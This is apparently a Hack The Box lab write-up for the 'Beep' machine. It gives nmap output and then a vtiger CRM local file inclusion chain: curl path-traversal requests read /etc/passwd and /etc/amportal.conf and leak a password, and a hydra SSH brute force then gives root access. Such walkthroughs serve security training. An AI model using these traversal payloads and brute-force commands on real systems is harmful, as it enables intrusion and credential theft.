### Beep HTB

### Difficulty: Easy

### IP Address = 10.10.10.7

Nmap Scan:

```
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Beep]
└─$ nmap -sCV -A 10.10.10.7 -p22,25,80,110,111,143,443,879,993,995,3306,4190,4445,4459,5038,10000 -oN nmapscan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-20 03:16 WAT
Nmap scan report for 10.10.10.7
Host is up (0.27s latency).

PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open   smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open   http       Apache httpd 2.2.3
|_http-title: Did not follow redirect to https://10.10.10.7/
|_http-server-header: Apache/2.2.3 (CentOS)
110/tcp   open   pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_pop3-capabilities: EXPIRE(NEVER) UIDL STLS AUTH-RESP-CODE APOP USER RESP-CODES LOGIN-DELAY(0) PIPELINING IMPLEMENTATION(Cyrus POP3 server v2) TOP
111/tcp   open   rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            876/udp   status
|_  100024  1            879/tcp   status
143/tcp   open   imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_imap-capabilities: LITERAL+ Completed OK URLAUTHA0001 ID SORT=MODSEQ IMAP4 NO BINARY ACL MAILBOX-REFERRALS CATENATE STARTTLS QUOTA LIST-SUBSCRIBED UNSELECT LISTEXT CHILDREN CONDSTORE IDLE X-NETSCAPE MULTIAPPEND THREAD=REFERENCES THREAD=ORDEREDSUBJECT ATOMIC SORT ANNOTATEMORE RIGHTS=kxte RENAME UIDPLUS NAMESPACE IMAP4rev1
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_imap-ntlm-info: ERROR: Script execution failed (use -d to debug)
443/tcp   open   ssl/http   Apache httpd 2.2.3 ((CentOS))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Elastix - Login page
|_http-server-header: Apache/2.2.3 (CentOS)
|_ssl-date: 2023-01-20T03:19:40+00:00; +59m59s from scanner time.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
879/tcp   open   status     1 (RPC #100024)
993/tcp   open   ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open   pop3       Cyrus pop3d
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-known-key: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
3306/tcp  open   mysql      MySQL (unauthorized)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
4190/tcp  open   sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open   upnotifyp?
4459/tcp  closed unknown
5038/tcp  open   asterisk   Asterisk Call Manager 1.1
10000/tcp open   http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

Host script results:
|_clock-skew: 59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 319.41 seconds
```

Thats a lot of ports lol 

Anyways lets begin enumeration 

I can' start with port 25(smtp), 110(pop3), 143(imap) & 3306(mysql) yet cause i don't have credential

Checking port 80 which is http redirects to port 443 which is https returns a login page
![image](https://user-images.githubusercontent.com/113513376/213604669-f794ed8f-73d8-4bc7-8824-ede0ae748c69.png)

I tried default and weak passwords but it didn't work

Checking for default credential for `Elastix` gives a result but on trying it, it doesn't work
![image](https://user-images.githubusercontent.com/113513376/213604772-2e3e1fe7-b097-4d84-bd62-de92c6870204.png)

So i'm moving to the next http server on port 10000 while am doing that i leave directory buster running in background

The http server on port 10000 is running webmin
![image](https://user-images.githubusercontent.com/113513376/213605660-7c3ed8dd-60a0-4441-ac44-a734216c6c3c.png)

Searching for exploit returns this 
![image](https://user-images.githubusercontent.com/113513376/213605722-14ca665e-d9b2-48e6-91dc-56291cbc1b99.png)

So i'll try it out

But on trying the exploit it just keeps looping

```
┌──(mark㉿haxor)-[~/Desktop/THM/Wreath/CVE-2019-15107]
└─$ python3 CVE-2019-15107.py -p 10000 10.10.10.7

        __        __   _               _         ____   ____ _____                                      
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|                                     
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|                                       
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___                                      
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|                                      
                                                                                                        
                                                @MuirlandOracle                                         
                                                                                                        
                                                                                                        
[*] Server is running in SSL mode. Switching to HTTPS
[*] Server is running without SSL. Switching to HTTP
[*] Server is running in SSL mode. Switching to HTTPS
[*] Server is running without SSL. Switching to HTTP
[*] Server is running in SSL mode. Switching to HTTPS
[*] Server is running without SSL. Switching to HTTP
[*] Server is running in SSL mode. Switching to HTTPS
[*] Server is running without SSL. Switching to HTTP
[*] Server is running in SSL mode. Switching to HTTPS
[*] Server is running without SSL. Switching to HTTP
[*] Server is running in SSL mode. Switching to HTTPS
[*] Server is running without SSL. Switching to HTTP
[*] Server is running in SSL mode. Switching to HTTPS
[*] Server is running without SSL. Switching to HTTP
[*] Server is running in SSL mode. Switching to HTTPS
[*] Server is running without SSL. Switching to HTTP
[*] Server is running in SSL mode. Switching to HTTPS
[*] Server is running without SSL. Switching to HTTP
[*] Server is running in SSL mode. Switching to HTTPS
[*] Server is running without SSL. Switching to HTTP
[*] Server is running in SSL mode. Switching to HTTPS
[*] Server is running without SSL. Switching to HTTP
[*] Server is running in SSL mode. Switching to HTTPS
[*] Server is running without SSL. Switching to HTTP
^C
[*] Exiting....                                                                                         

[-] Failed to connect to http://10.10.10.7:10000/
```

Anyways lets move on

I tried logging in with its default credential which is admin:admin

But it didn't work
![image](https://user-images.githubusercontent.com/113513376/213606176-9a280132-5e9b-4e31-b560-010a9d07d910.png)

Back to the dirbuster result 

```
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Beep]
└─$ dirb https://10.10.10.7 directories             

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Jan 20 03:42:16 2023
URL_BASE: https://10.10.10.7/
WORDLIST_FILES: directories

-----------------

GENERATED WORDS: 14                                                            

---- Scanning URL: https://10.10.10.7/ ----
==> DIRECTORY: https://10.10.10.7/modules/                                                             
==> DIRECTORY: https://10.10.10.7/themes/                                                              
==> DIRECTORY: https://10.10.10.7/static/                                                              
==> DIRECTORY: https://10.10.10.7/lang/                                                                
==> DIRECTORY: https://10.10.10.7/var/                                                                 
==> DIRECTORY: https://10.10.10.7/panel/                                                               
==> DIRECTORY: https://10.10.10.7/libs/                                                                
==> DIRECTORY: https://10.10.10.7/recordings/                                                          
==> DIRECTORY: https://10.10.10.7/configs/                                                             
==> DIRECTORY: https://10.10.10.7/vtigercrm/                                                           
```

Checking each directories doesn't give anything except the /vtigercrm
![image](https://user-images.githubusercontent.com/113513376/213606965-a7ee0179-d37b-41b1-a24d-74fbd9ac9361.png)

It's a login page and below we have the version `vtiger CRM 5.1.0`

Now lets search for exploits

![image](https://user-images.githubusercontent.com/113513376/213607067-5770525a-8e73-4d38-8b44-e0abe4f9f506.png)

They say its vulnerable to Local File Inclusion 

Lets check it out

```                                                                                                       
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Beep]
└─$ curl -k https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
distcache:x:94:94:Distcache:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
pcap:x:77:77::/var/arpwatch:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
dbus:x:81:81:System message bus:/:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
mailman:x:41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
spamfilter:x:500:500::/home/spamfilter:/bin/bash
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
fanis:x:501:501::/home/fanis:/bin/bash
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Beep]
└─$ 

```

Wow it works 

So lets see what we can loot or exploit from this vulnerability

While I loot i save the list of users in a file then run it against pop3,imap,&mysql using the userlist as password

The lfi can't read .php,.log files 

So after a while i checked the nmap scan and saw a service running on it 

```
5038/tcp  open   asterisk   Asterisk Call Manager 1.1
```

Thats a telecom service used by FreePBX, an open-source web-based graphical user interface (GUI) that controls and manages Asterisk

Its credential is stored in /etc/amportal.conf from research. 

Now i can try to leak it 

```
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Beep]
└─$ curl -k https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/amportal.conf%00                    
# This file is part of FreePBX.
#
#    FreePBX is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 2 of the License, or
#    (at your option) any later version.
#
#    FreePBX is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with FreePBX.  If not, see <http://www.gnu.org/licenses/>.
#
# This file contains settings for components of the Asterisk Management Portal
# Spaces are not allowed!
# Run /usr/src/AMP/apply_conf.sh after making changes to this file

# FreePBX Database configuration
# AMPDBHOST: Hostname where the FreePBX database resides
# AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)
# AMPDBNAME: Name of the FreePBX database (e.g. asterisk)
# AMPDBUSER: Username used to connect to the FreePBX database
# AMPDBPASS: Password for AMPDBUSER (above)
# AMPENGINE: Telephony backend engine (e.g. asterisk)
# AMPMGRUSER: Username to access the Asterisk Manager Interface
# AMPMGRPASS: Password for AMPMGRUSER
#
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE

```

Now we have a password but we don't know the user it works on 

So running ssh brute force using the password `jEhdIekWmdjE` against the user list generated 

```
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Beep]
└─$ curl -k https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00 | cut -d ":" -f 1  > users
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1638  100  1638    0     0   1277      0  0:00:01  0:00:01 --:--:--  1278
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Beep]
└─$ cat users      
root
bin
daemon
adm
lp
sync
shutdown
halt
mail
news
uucp
operator
games
gopher
ftp
nobody
mysql
distcache
vcsa
pcap
ntp
cyrus
dbus
apache
mailman
rpc
postfix
asterisk
rpcuser
nfsnobody
sshd
spamfilter
haldaemon
xfs
fanis
```

Now running hydra agaist the users

```                                                                                                      
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Beep]
└─$ hydra -L users -p jEhdIekWmdjE ssh://10.10.10.7 -t64
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-20 04:15:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 35 tasks per 1 server, overall 35 tasks, 35 login tries (l:35/p:1), ~1 try per task
[DATA] attacking ssh://10.10.10.7:22/
[22][ssh] host: 10.10.10.7   login: root   password: jEhdIekWmdjE
```

Cool the password works for root 

Now we can login as root xD

And we're done 

<br> <br>
[Back To Home](../../index.md)
<br>

